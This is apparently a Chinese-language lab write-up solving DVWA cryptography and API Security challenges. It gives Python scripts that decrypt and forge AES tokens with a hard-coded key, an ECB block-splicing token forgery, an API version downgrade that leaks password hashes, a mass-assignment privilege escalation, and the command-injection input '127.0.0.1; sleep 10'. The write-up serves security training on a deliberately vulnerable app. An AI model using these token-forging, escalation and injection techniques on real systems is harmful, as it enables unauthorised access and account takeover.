token值为：d85e900f76e71fa86a16311ba48a84759c7862a93b51e030ec1de16d977c4cbddcadb948325ff77f504b7a80b4a58b4d934504d46dd9d1193205fc71ad5718abb0d4d5267cedd6fe40d05652c87711f0

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754641879444-0c364462-6855-4caf-81ab-4e3abb86ec5f.png)

成功了，注意sweep是小写的

看了别的糕手还有不看源码的解法，放在下面

关键背景信息

令牌格式：JSON 结构为

{“user”:“example”,“ex”:1723620372,“level”:“user”,“bio”:“blah”}

加密方式：AES-128-ECB 模式

特性：相同明文块始终加密为相同密文块，无链式依赖。

块大小：16 字节（32 个十六进制字符）。

给定令牌：

Sooty (admin, expired)：96 字节（6 块），包含 “level”:“admin”。

Sweep (user, expired)：80 字节（5 块），包含 “level”:“user”。

Soo (user, valid)：96 字节（6 块），包含有效的 ex（过期时间）。



解题步骤

步骤 1: 分析块对齐和 ECB 特性

用户名 用户名字符数 块 0 (0-31) 块 1 (32-63) 块 2 (64-95)

Sooty 5 (“Sooty”) e287af752ed3f9601befd45726785bd9 b85bb230876912bf3c66e50758b222d0 837d1e6b16bfae07b776feb7afe57630

Sweep 5 (“Sweep”) 3061837c4f9debaf19d4539bfa0074c1 b85bb230876912bf3c66e50758b222d0 83f2d277d9e5fb9a951e74bee57c77a3

Soo 3 (“Soo”) 5fec0b1c993f46c8bad8a5c8d9bb9698 174d4b2659239bbc50646e14a70becef 83f2d277d9e5fb9a951e74bee57c77a3



关键发现：

Sweep 和 Sooty 的块 1 相同（b85bb230…）：说明两者 user 字段后紧跟的 JSON 结构对齐（用户名字符数相同）。

Sweep 和 Soo 的块 2 相同（83f2d277…）：尽管用户名字符数不同（5 vs 3），但 level 字段的起始位置在块 2 中一致。这表明 bio 字段长度被调整以保持块对齐。



步骤 2: 攻击目标分解

需组合以下要素：

用户身份：“user”:“Sweep” → 取自 Sweep 的块 0。

管理员权限：“level”:“admin” → 取自 Sooty 的块 2。

有效会话：ex 需未过期 → 取自 Soo 的块 1（因 Soo 令牌有效）。

令牌完整性：最终令牌需为 96 字节（6 块），与有效令牌（Soo）一致。



步骤 3: 初始错误分析

第一次尝试（错误）：

组合 Sweep块0 + Sweep块1 + Sooty块2 + Sweep块3 + Sweep块4

结果：登录成功但用户权限错误（“Login successful but not as the right user.”）。



错误原因：

使用了 Sweep 的块 1（对应 ex 已过期）。

应用程序验证了 ex 字段的有效性（过期令牌被拒绝权限）。

步骤 4: 修正方案设计

目标：

需将 ex 字段替换为 Soo 的有效值，但 ex 位于块 1，其内容依赖于用户名字符数（5 字符用户名后 ex 的起始位置固定）。

解决方案：

利用 ECB 的块独立性，直接移植 Soo 的有效块 1（含未过期 ex），尽管用户名长度不同（3 vs 5）。这是因为：

块 0 的结尾（,）与块 1 的开头（“ex”）在 JSON 中天然兼容。

应用程序可能容忍字段名短暂错位（如 “x”: 被解析为 “ex”），只要关键字段可读。

最终块组合：

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754643169017-cf0c348c-3d98-4de1-89fc-2323775f6391.png)

拼接令牌：

3061837c4f9debaf19d4539bfa0074c1 (Sweep块0) +

174d4b2659239bbc50646e14a70becef (Soo块1) +

837d1e6b16bfae07b776feb7afe57630 (Sooty块2) +

c9acb1f268c06c5e760a9d728e081fab65e83b9f97e65cb7c7c4b8427bd44abc16daa00fd8cd0105c97449185be77ef5 (Soo块3-5)

即：3061837c4f9debaf19d4539bfa0074c1174d4b2659239bbc50646e14a70becef837d1e6b16bfae07b776feb7afe57630c9acb1f268c06c5e760a9d728e081fab65e83b9f97e65cb7c7c4b8427bd44abc16daa00fd8cd0105c97449185be77ef5 

用户身份正确：

块 0 来自 Sweep → “user”:“Sweep” 被保留。

管理员权限获取：

块 2 来自 Sooty → “level”:“admin” 替换了原始的 “user”。

会话有效性保证：

块 1 来自 Soo → 包含未过期的 ex 时间戳。

令牌完整性：

长度 96 字节（与有效令牌 Soo 一致）。

块 3-5 来自 Soo 的 bio 字段，维持 JSON 结构完整。

容错性分析：

块 1 移植可能导致 ex 字段名短暂错位（如 “x”:），但 ECB 无完整性校验，且应用程序可能：

优先搜索 “user” 和 “level” 字段。

忽略 bio 字段的局部错位。

### 难度high
审计代码

```plain
<?php

require_once ("token_library_high.php");

$ret = "";

if ($_SERVER['REQUEST_METHOD'] == "POST") {
	if ($_SERVER['CONTENT_TYPE'] != "application/json") {
		$ret = json_encode (array (
						"status" => 527,
						"message" => "Content type must be application/json"
					));
	} else {
		$token = $jsonData = file_get_contents('php://input');
		$ret = check_token ($token);
	}
} else {
	$ret = json_encode (array (
					"status" => 405,
					"message" => "Method not supported"
				));
}

print $ret;
exit;
```

引入了一个名为 token_library_high.php 的文件，里面有

```plain
define ("KEY", "rainbowclimbinghigh");
define ("ALGO", "aes-128-cbc");
define ("IV", "1234567812345678");
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754642309673-68dd3ca6-1909-4213-ae41-66e3d2f94f26.png)

翻译：

你设法从预言（Prognostication）应用的一名用户那里窃取到了以下令牌（token）。

{"token":"PhQwGVA3q+T2mT+L3Pe5Vg==","iv":"MTIzNDU2NzgxMjM0NTY3OA=="}

你可以使用下面的表单来提供令牌以访问系统。你面临两个挑战：首先，解密这个令牌以找出它包含的秘密；然后，创建一个新的令牌以其他用户的身份访问系统。看看你能否将自己变成管理员。

令牌：

{"token":"PhQwGVA3q+T2mT+L3Pe5Vg==","iv":"MTIzNDU2NzgxMjM0NTY3OA=="}

这个提交可以点，点进去会显示现在是user用户Bungle，抓包看看

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754642815375-cb8856d5-6e7f-49d4-b1c4-df4e41c652d0.png)

记录下

{"token":"PhQwGVA3q+T2mT+L3Pe5Vg==","iv":"MTIzNDU2NzgxMjM0NTY3OA=="}

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754643927555-9e7493bd-6da9-4e43-b336-b5c62d098de9.png)

token：加密后的密文（Base64 编码）

iv：初始化向量（IV，也是 Base64 编码）

解码后：

iv 是 "1234567812345678"（16字节，符合AES的IV长度）

token 是 16字节密文，说明使用的是 AES-128-CBC 模式（每块16字节）

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754645155808-9688a133-6a26-4dfd-9ff5-e5070374614e.png)

根据源码里的key等值写个解密jio本

```plain
from Crypto.Cipher import AES
import base64

key = b'rainbowclimbingh'  # 取前16字节
iv = b'1234567812345678'
ciphertext = base64.b64decode('PhQwGVA3q+T2mT+L3Pe5Vg==')

cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = cipher.decrypt(ciphertext)
print("解密后的明文：", plaintext)
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754881996306-0816def8-07f3-4388-9b1d-91b3b3b9520f.png)

输出 b'userid:2\x08\x08\x08\x08\x08\x08\x08\x08'

再写个加密jio本加密userid:1，把 2 改成 1（或 0 等），通常管理员 ID 会是 1 或 0。

```plain
from Crypto.Cipher import AES
import base64

key = b'rainbowclimbingh'  # 前16字节
iv = b'1234567812345678'
plaintext = b'userid:1'
# PKCS#7填充：缺9字节，补9个0x09
pad_len = 16 - len(plaintext)
plaintext += bytes([pad_len] * pad_len)

cipher = AES.new(key, AES.MODE_CBC, iv)
ciphertext = cipher.encrypt(plaintext)

token = base64.b64encode(ciphertext).decode()
iv_b64 = base64.b64encode(iv).decode()
print('{"token":"' + token + '","iv":"' + iv_b64 + '"}')
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754882245622-8d864939-6486-47a8-85df-9c1599dd6a79.png)

输出 {"token":"uN4N+V73wdXa+qowB7cc3A==","iv":"MTIzNDU2NzgxMjM0NTY3OA=="}

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754882159285-48ce440d-8649-4cfb-821a-f9d2d163a57e.png)

## 十八、API安全（API Security）
### 配置环境
![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1754882540391-50102f59-9933-4b3d-ab40-769d0e080e7f.png)

```plain
sudo apt update
systemctl restart apache2
sudo a2enmod rewrite
sudo apt install -y php-cli php-mbstring php-xml php-curl unzip curl
curl -sS https://getcomposer.org/installer | php
sudo mv composer.phar /usr/local/bin/composer
composer --version
```

```plain
cd /var/www/html/DVWA/vulnerabilities/api
sudo composer install
sudo nano /etc/apache2/sites-available/000-default.conf
# 在 </VirtualHost> 之前插入下面这段
<Directory /var/www/html>
    Options Indexes FollowSymLinks
    AllowOverride All
    Require all granted
</Directory>
# 重启
sudo systemctl restart apache2
```

```plain
sudo nano /var/www/html/DVWA/vulnerabilities/api/.htaccess
# 改成以下
<IfModule mod_rewrite.c>
    RewriteEngine On
    RewriteBase /DVWA/vulnerabilities/api/

    # 如果文件或目录存在，直接访问
    RewriteCond %{REQUEST_FILENAME} -f [OR]
    RewriteCond %{REQUEST_FILENAME} -d
    RewriteRule ^ - [L]

    # 否则路由到 index.php
    RewriteRule ^ index.php [QSA,L]
</IfModule>
cd /var/www/html/DVWA/vulnerabilities/api
php /usr/local/bin/composer.phar install
sudo systemctl restart apache2
```

这个我不知道对不对啊，因为我按照github上说的这样配置了之后页面也没对。。我直接去源码里给url前面加上了DVWA，然后重启进去页面才正常的。。。之后的难度也一样改源码。

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1755672187885-130b62be-7daf-4d0a-b06e-9830972a1475.png)

正常应该是这样的。你配错的话就没有这块，f12会看到user接口访问404。

### 前言
API 安全是一套保护应用程序接口（API）免受攻击和滥用的策略和技术。其目标是确保数据的机密性、完整性和可用性（CIA三元组），同时保护后端服务。

主要威胁（OWASP API Top 10 精要）

失效的对象级授权（BOLA）： 攻击者通过修改请求中的ID（如用户ID、文件ID）来访问本无权访问的数据。

失效的身份认证： 认证机制存在缺陷，允许攻击者盗用用户身份（如令牌泄露、弱JWT密钥）。

失效的象属性级授权： 允许用户更改其不应有权限修改的对象属性（如通过请求体更新其他用户的角色）。

资源滥用： API 无速率限制，导致被用于拒绝服务（DoS）攻击或资源爬取。

失效的功能级授权： 访问控制不完善，允许低权限用户访问高权限的管理员端点。

不受限的资源消耗： 处理复杂请求时消耗过多资源（如CPU、内存），导致服务瘫痪。

服务器端请求伪造（SSRF）： API 接受用户提供的URL并访问内部资源，导致内网被探测。

安全配置错误： 不安全默认配置、未及时打补丁、开放的云存储等。

不当的资产管理： 暴露了旧版、测试版或调试端点。

日志和监控不足： 无法及时检测和响应攻击。



核心防护措施（四位一体）

身份认证（Authentication - “你是谁？”）

目的： 验证用户/客户端的身份。

标准： 使用强标准如 OAuth 2.0 / OpenID Connect (OIDC)、API Keys（用于服务间通信）、JWT（JSON Web Tokens）

授权（Authorization - “你能做什么？”）

目的： 确定已认证实体的访问权限。

关键： 在所有层级实施严格的访问控制：端点、功能、对象、属性。

加密与完整性（Encryption & Integrity）

传输中： 强制使用 HTTPS (TLS) 加密所有通信。

静态： 对敏感数据进行加密存储。

签名： 使用签名（如JWT签名）确保消息未被篡改。

可用性与审计（Availability & Audit）

速率限制： 防止滥用和DoS攻击（按IP、用户、令牌等限制）。

输入验证： 对所有输入进行严格的校验、过滤和清理，防止注入攻击。

输出编码： 防止响应中包含恶意代码（XSS）。

日志记录与监控： 记录所有访问尝试、错误和异常行为，并设置实时警报。

### 难度low
审计代码

```plain
function loadTableData(items) {
    ...
    item = items[0]; // 获取返回数据数组的第一项
    Object.keys(item).forEach(function(k){ // 遍历这个数据对象的所有键
        let cell = row.insert_th_Cell(-1);
        cell.innerHTML = k; // 将键名（如'id', 'name'）作为表头
        if (k == 'password') { // 关键判断！如果存在键名为'password'
            successDiv = document.getElementById ('message');
            successDiv.style.display = 'block'; // 则显示隐藏的成功信息
        }
    });
    ...
}
```

翻译一下页面：

API版本控制非常重要，运行多个API版本可以实现向后兼容，并且能在不影响现有用户的情况下添加新服务。但维持旧版本运行的缺点在于，这些旧版本可能包含漏洞。

id 名称 等级

1 tony 0

2 morph 1

3 chas 1

请查看创建此表的调用语句，尝试利用它来返回一些额外信息。

试试看burpsuite抓那个user接口的包

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1755674171481-125d2596-0d57-4498-abfa-5a1da2007c31.png)

把url里的v2改成v1

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1755674536582-7261599f-791a-451c-b9ca-40260cdf0002.png)

能看到hash密码

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1755674573180-71f64bba-e84d-4528-8c83-639856558401.png)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1755676688909-5980ab4f-de10-4f02-844b-6f02fd82813d.png)

### 难度medium
审计代码

```plain
function update_name() {
    const url = '/DVWA/vulnerabilities/api/v2/user/2';
    const name = document.getElementById ('name').value;
    const data = JSON.stringify({name: name}); //  只发送name字段
     
    fetch(url, { 
        method: 'PUT',                       //  使用PUT方法更新
        headers: { 
            'Content-Type': 'application/json' 
        }, 
        body: data
    }) 
    .then(response => { 
        if (!response.ok) { 
            throw new Error('Network response was not ok'); 
        } 
        return response.json(); 
    }) 
    .then(data => { 
        update_username(data);              // 更新显示信息
    }) 
    .catch(error => { 
        console.error('There was a problem with your fetch operation:', error); 
    }); 
}
```

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1755675102489-c4dbffad-d554-4e20-86e2-dbd2c33c76eb.png)

翻译：

翻译

漏洞：API 安全

查看用于更新您名称的调用，并利用它来将您的用户提升为管理员（level 0）。

用户详情：morph（用户）

名称：morph

burpsuite抓包

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1755676226203-b732f845-465e-4696-a0d9-eb2f8e1a085b.png)

Content-Length: 从 16 改为 28（因为请求体从 {"name":"morph"} 变为 {"name":"morph","level":0}）

请求体: 添加了 "level":0 字段

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1755676424838-8c0207c7-6cc6-4e29-938a-affbde63ca01.png)

可以看到返回成功了

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1755676506995-7f324f24-166c-42ad-8c85-a6aebc3c8ea7.png)

### 难度high
DVWA界面没有有用的源码可以审计

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1755676810971-5df76b7b-721b-4e34-ae60-582e902f37ee.png)

翻译：

看一下这份OpenAPI文档，检查其中的健康检查功能，看看能否发现存在漏洞的函数。

您或许可以手动调用各个函数进行分析，但更简便的方式是将其导入Swagger UI、Burp、ZAP或Postman等工具中，让工具自动完成请求的配置工作（这样能省去大量手动操作）。



openapi.yml内容如下

```plain
openapi: 3.0.0
info:
  title: 'DVWA API'
  contact:
    url: 'https://github.com/digininja/DVWA/'
    email: robin@digi.ninja
  version: '0.1'
servers:
  -
    url: 'http://dvwa.test'
    description: 'API server'
paths:
  /vulnerabilities/api/v2/health/echo:
    post:
      tags:
        - health
      description: 'Echo, echo, cho, cho, o o ....'
      operationId: echo
      requestBody:
        description: 'Your words.'
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/Words'
      responses:
        '200':
          description: 'Successful operation.'
  /vulnerabilities/api/v2/health/connectivity:
    post:
      tags:
        - health
      description: 'The server occasionally loses connectivity to other systems and so this can be used to check connectivity status.'
      operationId: checkConnectivity
      requestBody:
        description: 'Remote host.'
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/Target'
      responses:
        '200':
          description: 'Successful operation.'
  /vulnerabilities/api/v2/health/status:
    get:
      tags:
        - health
      description: 'Get the health of the system.'
      operationId: getHealthStatus
      responses:
        '200':
          description: 'Successful operation.'
  /vulnerabilities/api/v2/health/ping:
    get:
      tags:
        - health
      description: 'Simple ping/pong to check connectivity.'
      operationId: ping
      responses:
        '200':
          description: 'Successful operation.'
  /vulnerabilities/api/v2/login/login:
    post:
      tags:
        - login
      description: 'Login as user.'
      operationId: login
      requestBody:
        description: 'The login credentials.'
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/Credentials'
      responses:
        '200':
          description: 'Successful operation.'
        '401':
          description: 'Invalid credentials.'
  /vulnerabilities/api/v2/login/check_token:
    post:
      tags:
        - login
      description: 'Check a token is valid.'
      operationId: check_token
      requestBody:
        description: 'The token to test.'
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/Token'
      responses:
        '200':
          description: 'Successful operation.'
        '401':
          description: 'Token is invalid.'
  '/vulnerabilities/api/v2/order/{id}':
    get:
      tags:
        - order
      description: 'Get a order by ID.'
      operationId: getOrderByID
      parameters:
        -
          name: id
          in: path
          required: true
          schema:
            type: integer
      responses:
        '200':
          description: 'Successful operation.'
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/Order'
        '404':
          description: 'Order not found.'
      security:
        -
          scalar: basicAuth
    put:
      tags:
        - order
      description: 'Update an order by ID.'
      operationId: updateOrder
      parameters:
        -
          name: id
          in: path
          required: true
          schema:
            type: integer
      requestBody:
        description: 'New order data.'
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/OrderUpdate'
      responses:
        '200':
          description: 'Successful operation.'
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/Order'
        '404':
          description: 'Order not found'
        '422':
          description: 'Invalid order object provided'
    delete:
      tags:
        - order
      description: 'Delete order by ID.'
      operationId: deleteOrderById
      parameters:
        -
          name: id
          in: path
          required: true
          schema:
            type: integer
      responses:
        '200':
          description: 'Successful operation.'
        '404':
          description: 'Order not found'
  /vulnerabilities/api/v2/order/:
    get:
      tags:
        - order
      description: 'Get all orders.'
      operationId: getOrders
      responses:
        '200':
          description: 'Successful operation.'
          content:
            application/json:
              schema:
                type: array
                items:
                  $ref: '#/components/schemas/Order'
    post:
      tags:
        - order
      description: 'Create a new order.'
      operationId: addOrder
      requestBody:
        description: 'Order data.'
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/OrderAdd'
      responses:
        '200':
          description: 'Successful operation.'
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/Order'
        '422':
          description: 'Invalid order object provided'
  '/vulnerabilities/api/v2/user/{id}':
    get:
      tags:
        - user
      description: 'Get a user by ID.'
      operationId: getUserByID
      parameters:
        -
          name: id
          in: path
          required: true
          schema:
            type: integer
      responses:
        '200':
          description: 'Successful operation.'
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/User'
        '404':
          description: 'User not found.'
    put:
      tags:
        - user
      description: 'Update a user by ID.'
      operationId: updateUser
      parameters:
        -
          name: id
          in: path
          required: true
          schema:
            type: integer
      requestBody:
        description: 'New user data.'
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/UserUpdate'
      responses:
        '200':
          description: 'Successful operation.'
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/User'
        '404':
          description: 'User not found'
        '422':
          description: 'Invalid user object provided'
    delete:
      tags:
        - user
      description: 'Delete user by ID.'
      operationId: deleteUserById
      parameters:
        -
          name: id
          in: path
          required: true
          schema:
            type: integer
      responses:
        '200':
          description: 'Successful operation.'
        '404':
          description: 'User not found'
  /vulnerabilities/api/v2/user/:
    get:
      tags:
        - user
      description: 'Get all users.'
      operationId: getUsers
      responses:
        '200':
          description: 'Successful operation.'
          content:
            application/json:
              schema:
                type: array
                items:
                  $ref: '#/components/schemas/User'
    post:
      tags:
        - user
      description: 'Create a new user.'
      operationId: addUser
      requestBody:
        description: 'User data.'
        content:
          application/json:
            schema:
              $ref: '#/components/schemas/UserAdd'
      responses:
        '200':
          description: 'Successful operation.'
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/User'
        '422':
          description: 'Invalid user object provided'
components:
  schemas:
    Target:
      required:
        - target
      properties:
        target:
          type: string
          example: digi.ninja
      type: object
    Words:
      required:
        - words
      properties:
        words:
          type: string
          example: 'Hello World'
      type: object
    Credentials:
      required:
        - username
        - password
      properties:
        username:
          type: string
          example: user
        password:
          type: string
          example: password
      type: object
    Order:
      properties:
        id:
          type: integer
          example: 1
        name:
          type: string
          example: 'Tony Hart'
        address:
          type: string
          example: 'BBC Television Centre, London W3 6XZ'
        items:
          type: string
          example: '1 * brush, 2 * paints, 1 * easel'
        status:
          type: integer
          example: 1
      type: object
    OrderAdd:
      required:
        - level
        - name
      properties:
        name:
          type: string
          example: fred
        address:
          type: string
          example: '1 High Street, Atown'
        items:
          type: string
          example: '2 * brushes'
      type: object
    OrderUpdate:
      properties:
        name:
          type: string
          example: fred
        address:
          type: string
          example: '1 High Street, Atown'
        items:
          type: string
          example: '2 * brushes'
      type: object
    Token:
      required:
        - token
      properties:
        token:
          type: string
          example: '11111'
      type: object
    User:
      properties:
        id:
          type: integer
          example: 1
        name:
          type: string
          example: fred
        level:
          type: integer
          example: 1
      type: object
    UserAdd:
      required:
        - level
        - name
      properties:
        name:
          type: string
          example: fred
        level:
          type: integer
          example: 1
      type: object
    UserUpdate:
      required:
        - name
      properties:
        name:
          type: string
          example: fred
      type: object
  securitySchemes:
    http:
      type: http
      name: authorization
tags:
  -
    name: user
    description: 'User operations.'
  -
    name: health
    description: 'Health operations.'
  -
    name: order
    description: 'Order operations.'
  -
    name: login
    description: 'Login operations.'

```

终端输入zaproxy启动zap

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1755677971363-fa23a253-e235-49b3-abd5-dc463ba392c4.png)

复制文件url过去，然后在下面目标 URL (Target URL)里填写DVWA地址，导入

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1755678120791-00e2d4d3-65a9-4b01-9535-2bd41c6ed438.png)

成功后显示

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1755678073409-54be096a-c99a-4f2f-9ea7-d2fcbacf76e8.png)

接下去设置身份认证，让ZAP代理浏览器流量

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1755678597971-c79c5bf2-9c0f-496d-aa9a-ceba9eb79492.png)

选择第一个主动扫描

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1755678713313-9c233b8d-2b2b-410d-bfa7-c7616cb53008.png)

扫描完成，有一个high的url [http://localhost/DVWA/vulnerabilities/api/v2/health/connectivity](http://localhost/DVWA/vulnerabilities/api/v2/health/connectivity)

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1755679181893-b393956e-edd9-421e-9a68-021614af036f.png)

编辑，放入构造的payload，我这里放了{"target": "127.0.0.1; sleep 10"}

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1755680434659-c152b6f8-22a1-4064-ad33-24d4f4b2c520.png)

执行成功后发现确实比正常的响应多10s（忽略那几个500状态码，是我在测其他的）

![](https://cdn.nlark.com/yuque/0/2025/png/52313993/1755680559808-e9856b41-837b-4e9e-b7a8-6af004b91bc7.png)

说明确实存在操作系统命令注入漏洞。

